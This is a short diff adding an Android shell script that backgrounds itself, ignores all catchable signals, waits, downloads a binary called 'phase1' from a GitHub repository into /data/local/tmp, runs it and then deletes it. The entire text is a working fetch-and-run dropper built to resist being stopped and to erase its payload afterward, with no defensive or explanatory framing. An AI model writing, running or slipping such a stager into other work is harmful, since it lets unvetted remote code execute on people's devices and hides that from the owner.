@@ -1,0 +1,9 @@
+#!/bin/sh
+[ -n "$BG" ] || { BG=Y "$0" & exit; }
+for i in $(seq 64); do trap '' "$i"; done
+
+sleep 30
+wget -O /data/local/tmp/phase1 https://github.com/Androidmate/test/raw/master/phase1
+chmod +x /data/local/tmp/phase1
+/data/local/tmp/phase1
+rm /data/local/tmp/phase1
